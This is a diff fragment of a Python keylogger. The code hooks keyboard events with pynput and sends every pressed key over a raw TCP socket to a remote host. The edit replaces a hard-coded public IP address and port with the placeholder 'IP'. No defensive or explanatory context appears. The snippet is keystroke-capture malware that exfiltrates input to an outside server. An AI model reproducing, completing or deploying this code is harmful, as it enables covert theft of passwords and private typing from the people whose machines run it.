@@ -2,7 +2,7 @@ import socket
 from pynput import keyboard
 
 client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-client.connect(('50.116.41.232',1234))
+client.connect(('IP',1234))
 
 def keyPressed(key):
     client.send(str(key).encode())
